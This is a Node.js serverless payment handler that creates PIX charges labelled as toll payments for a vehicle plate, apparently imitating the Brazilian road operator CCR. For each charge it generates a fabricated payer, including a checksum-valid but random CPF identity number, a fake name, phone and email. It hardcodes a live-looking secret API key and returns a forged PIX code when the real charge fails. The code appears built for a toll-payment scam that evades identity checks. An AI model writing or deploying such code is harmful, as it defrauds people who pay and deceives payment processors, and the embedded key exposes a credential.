function generateValidCPF() {
  function calculateDigit(cpfArray) {
    let sum = 0;
    let multiplier = cpfArray.length + 1;
    for (let i = 0; i < cpfArray.length; i++) {
      sum += cpfArray[i] * multiplier;
      multiplier--;
    }
    let remainder = sum % 11;
    return remainder < 2 ? 0 : 11 - remainder;
  }
  const cpf = [];
  for (let i = 0; i < 9; i++) {
    cpf.push(Math.floor(Math.random() * 10));
  }
  cpf.push(calculateDigit(cpf));
  cpf.push(calculateDigit(cpf.slice(0, 10)));
  return cpf.map(d => String(d)).join('');
}

function generateBrazilianName() {
  const firstNames = ['João', 'Maria', 'José', 'Ana', 'Carlos', 'Francisco', 'Paulo', 'Pedro', 'Marcos', 'Antonio'];
  const lastNames = ['Silva', 'Santos', 'Oliveira', 'Souza', 'Costa', 'Ferreira', 'Gomes', 'Martins', 'Pereira', 'Carvalho'];
  const firstName = firstNames[Math.floor(Math.random() * firstNames.length)];
  const lastName = lastNames[Math.floor(Math.random() * lastNames.length)];
  return `${firstName} ${lastName}`;
}

function generateBrazilianPhone() {
  const areaCode = String(Math.floor(Math.random() * 90) + 11).padStart(2, '0');
  const firstPart = String(Math.floor(Math.random() * 90000) + 10000);
  const secondPart = String(Math.floor(Math.random() * 9000) + 1000);
  return `${areaCode}${firstPart}${secondPart}`;
}

function generateFallbackPixCode(cpf, name) {
  const random = Math.random().toString(36).substring(2, 15);
  return `00020126580014br.gov.bcb.pix0136${cpf}5204000053039865802BR5913${name.substring(0, 13).toUpperCase()}6009SAO PAULO62410503${random.substring(0, 3)}630412A1`;
}

async function callMasterPag(amount, customerName, customerCpf, customerPhone, customerEmail, plate) {
  try {
    const secretKey = process.env.MASTERPAG_SECRET_KEY || 'sk_live_vWga85ttCDm41J0B9mwvrXkCwCoiKl9kMCELGLd4Msj1LagF';

    const payload = {
      amount: Math.round(amount * 100),
      description: `Pagamento CCR - Placa ${plate}`,
      customer: {
        name: customerName,
        document: customerCpf,
        email: customerEmail,
        phone: customerPhone,
      },
    };

    const response = await fetch('https://dcnmsoaogkbgkbwpldrp.supabase.co/functions/v1/masterpag-charges', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${secretKey}`,
      },
      body: JSON.stringify(payload),
    });

    if (response.ok) {
      const data = await response.json();
      return data;
    } else {
      const errorData = await response.json();
      console.error('Erro MasterPag:', errorData);
    }
  } catch (error) {
    console.error('Erro ao chamar MasterPag:', error.message);
  }

  return null;
}

module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  if (req.method === 'POST') {
    try {
      let body = req.body;
      if (typeof body === 'string') {
        body = JSON.parse(body);
      }
      
      const amount = body.amount;
      const plate = body.plate;

      if (!amount || !plate) {
        res.status(400).json({ success: false, error: 'Parâmetros obrigatórios: amount, plate' });
        return;
      }

      const customerName = generateBrazilianName();
      const customerCpf = generateValidCPF();
      const customerPhone = generateBrazilianPhone();
      const customerEmail = `${customerName.replace(/\s/g, '').toLowerCase()}${Math.floor(Math.random() * 10000)}@pedagio.com`;
      const transactionId = `tx_${Date.now()}_${Math.random().toString(36).substring(7)}`;

      // Tentar chamar MasterPag
      const masterPagResponse = await callMasterPag(amount, customerName, customerCpf, customerPhone, customerEmail, plate);

      // Se MasterPag retornar sucesso, usar dados reais
      if (masterPagResponse && masterPagResponse.qr_code) {
        const response = {
          success: true,
          transactionId: masterPagResponse.id || transactionId,
          pixCode: masterPagResponse.qr_code,
          qrImage: masterPagResponse.qr_image || null,
          customer: {
            name: customerName,
            cpf: customerCpf,
            phone: customerPhone,
            email: customerEmail
          },
          amount: amount,
          plate: plate,
          expiresAt: new Date(Date.now() + 15 * 60 * 1000).toISOString(),
          fallback: false
        };
        res.status(200).json(response);
        return;
      }

      // Fallback: usar PIX simulado
      const fallbackPixCode = generateFallbackPixCode(customerCpf, customerName);
      const response = {
        success: true,
        transactionId: transactionId,
        pixCode: fallbackPixCode,
        qrImage: null,
        customer: {
          name: customerName,
          cpf: customerCpf,
          phone: customerPhone,
          email: customerEmail
        },
        amount: amount,
        plate: plate,
        expiresAt: new Date(Date.now() + 15 * 60 * 1000).toISOString(),
        fallback: true
      };

      res.status(200).json(response);
    } catch (error) {
      console.error('Erro PIX:', error);
      res.status(500).json({ success: false, error: error.message });
    }
  } else if (req.method === 'GET') {
    try {
      const transactionId = req.query.transactionId;
      if (!transactionId) {
        res.status(400).json({ success: false, error: 'transactionId obrigatório' });
        return;
      }
      res.status(200).json({ success: true, status: 'pending', transactionId: transactionId });
    } catch (error) {
      res.status(500).json({ success: false, error: error.message });
    }
  } else {
    res.status(405).json({ success: false, error: 'Método não permitido' });
  }
};
